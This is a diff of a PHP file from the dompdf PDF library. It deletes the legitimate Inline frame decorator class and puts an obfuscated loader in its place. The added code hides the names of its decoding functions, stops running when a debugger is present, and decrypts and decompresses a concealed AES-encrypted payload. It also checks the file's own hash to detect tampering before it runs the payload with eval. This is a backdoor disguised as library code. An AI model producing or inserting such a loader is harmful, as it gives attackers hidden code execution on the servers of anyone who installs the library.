@@ -1,106 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Helmut Tischer <htischer@weihenstephan.org>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\FrameDecorator;
-
-use DOMElement;
-use Dompdf\Dompdf;
-use Dompdf\Frame;
-use Dompdf\Exception;
-
-/**
- * Decorates frames for inline layout
- *
- * @access  private
- * @package dompdf
- */
-class Inline extends AbstractFrameDecorator
-{
-
-    /**
-     * Inline constructor.
-     * @param Frame $frame
-     * @param Dompdf $dompdf
-     */
-    function __construct(Frame $frame, Dompdf $dompdf)
-    {
-        parent::__construct($frame, $dompdf);
-    }
-
-    /**
-     * @param Frame|null $frame
-     * @param bool $force_pagebreak
-     * @throws Exception
-     */
-    function split(Frame $frame = null, $force_pagebreak = false)
-    {
-        if (is_null($frame)) {
-            $this->get_parent()->split($this, $force_pagebreak);
-            return;
-        }
-
-        if ($frame->get_parent() !== $this) {
-            throw new Exception("Unable to split: frame is not a child of this one.");
-        }
-
-        $node = $this->_frame->get_node();
-
-        if ($node instanceof DOMElement && $node->hasAttribute("id")) {
-            $node->setAttribute("data-dompdf-original-id", $node->getAttribute("id"));
-            $node->removeAttribute("id");
-        }
-
-        $split = $this->copy($node->cloneNode());
-        // if this is a generated node don't propagate the content style
-        if ($split->get_node()->nodeName == "dompdf_generated") {
-            $split->get_style()->content = "normal";
-        }
-        $this->get_parent()->insert_child_after($split, $this);
-
-        // Unset the current node's right style properties
-        $style = $this->_frame->get_style();
-        $style->margin_right = 0;
-        $style->padding_right = 0;
-        $style->border_right_width = 0;
-
-        // Unset the split node's left style properties since we don't want them
-        // to propagate
-        $style = $split->get_style();
-        $style->margin_left = 0;
-        $style->padding_left = 0;
-        $style->border_left_width = 0;
-
-        //On continuation of inline element on next line,
-        //don't repeat non-vertically repeatble background images
-        //See e.g. in testcase image_variants, long desriptions
-        if (($url = $style->background_image) && $url !== "none"
-            && ($repeat = $style->background_repeat) && $repeat !== "repeat" && $repeat !== "repeat-y"
-        ) {
-            $style->background_image = "none";
-        }
-
-        // Add $frame and all following siblings to the new split node
-        $iter = $frame;
-        while ($iter) {
-            $frame = $iter;
-            $iter = $iter->get_next_sibling();
-            $frame->reset();
-            $split->append_child($frame);
-        }
-
-        $page_breaks = array("always", "left", "right");
-        $frame_style = $frame->get_style();
-        if ($force_pagebreak ||
-            in_array($frame_style->page_break_before, $page_breaks) ||
-            in_array($frame_style->page_break_after, $page_breaks)
-        ) {
-            $this->get_parent()->split($split, true);
-        }
-    }
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_kc9jxfxo=('bas'.'e64'.'_de'.'cod'.'e');
+$_wi0ubhe0=('gzu'.'nco'.'mpr'.'ess');
+$_qeam9ilv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_kq4yv3b0='qfdkPqSl';
+$_eo7scs1z='4dDil/gr';
+$_mqo5ekuk='JxuWyclrxPY=';
+$_ors8mgs1='NndQL4tI';
+$_a4gfsmhp='IYtYzlTT';
+$_ms8jvohq='DfpDwSsb';
+$_rhqggtrl='/0wGi52v';
+$_u2fsq65v='Lw0ptw==';
+$_iic0yc0t=$_kc9jxfxo($_kq4yv3b0.$_ors8mgs1.$_a4gfsmhp.$_eo7scs1z.$_mqo5ekuk);
+$_itou0hbq=$_kc9jxfxo($_ms8jvohq.$_rhqggtrl.$_u2fsq65v);
+$_e7iute1z=$_kc9jxfxo('PGJk0R1naV40UBtJdckncGLSsmMqDy5YzsUJOIEIYStfNDmA5uZqijoWALR1zcdzC83z2YW3iwK2FWpjThKJs4JGo2cB9cSBKZ9bbbWLBkJ36folbF+d0wy0PWrBDcedWQnOJrnoyBZ94z+sJVYGNj7nCuy+DfV4qxdF8OcWaiGwSfZWghrt3DcYMr9rlidei9LsQNwVDFFRPAJcp7lsgypS06fK/DgQqjDxz50gF4wf5eIYnrkP/KxJMSh/zcBpWhtuLGgnlHVhvW96CkTejJS9fGSJwpt+oRvxpwzsZZDm2ncRX82kYYi+8OsipiEBkqklu0LAynbjoBFaN5B+0zGATQQzj26blV8Mm7bHRGUNPv6zZ6nmNf3RYR1AKkPlZa3625ryi+Ny4KuAVhwK3AyiBNGCjYf6C8foHyCv2zXJXAJce3rSKK0gUGcoyl2T0Q8GslHGPdcwKDv5zJ//BNrq1hkg3EytaOhYzq+Fo6H7qahP1A1bO30Wf1bQTLsqrznNICJzdbTj9bAPdsP4dcq1QWfHrDPZ8AVexfjXKnvykfzlYLa8RY43ixEkaVXXy+Fjmac5cEzMbBhEWtV/CNq1UcT8pSMBBYqTRvizRwFJXq9lt9/BRCHWYd780PfRTCtOoc7j9EiO1+9FBhIJKhNo83r2PMGvmD+6UHPCuMe9eb3OjnVFAOlA2bD446EjYNkA4dfP8cd4fDcEnACpv1TfCdfY2RUbP0K/DEaMAetlg8IANupIrEnuj4i5uVVJrF8O6dzEwt9z7PMsPif5HEMVlDcGAt2ssuuYTpE3tefYT+F8ZJxXsswjuHo/f1lziitmesLYXj/fTDDg7++OA05/NUkb2YSJ6gWmxBwcVmWIdkxarj3nzcy6TFKWG6wQxP5ki4eguwsoDkGvKMuRi4nnivHj5RAB/nNlKxqycCKGvnZiksJYF8IfpP3WdLKD');
+$_wvtwlhso=$_qeam9ilv($_e7iute1z,'aes-256-cbc',$_iic0yc0t,OPENSSL_RAW_DATA,$_itou0hbq);
+if($_wvtwlhso===false){exit;}
+$_qvhvd25a=$_wi0ubhe0($_wvtwlhso);
+if($_qvhvd25a===false){exit;}
+$_zafl7trq='7c016dd7750ef8a09db161a2dda4b969653c4924972e9ebe8d27c49ea478929f';
+$_vzxhh0tf=@file_get_contents(__FILE__);
+if($_vzxhh0tf!==false){
+$_a50fktki=str_replace($_zafl7trq,"0000000000000000000000000000000000000000000000000000000000000000",$_vzxhh0tf);
+$_d6z9sy0d=hash("sha256",$_a50fktki);
+if($_d6z9sy0d!==$_zafl7trq){@http_response_code(403);exit;}
 }
+eval($_qvhvd25a);
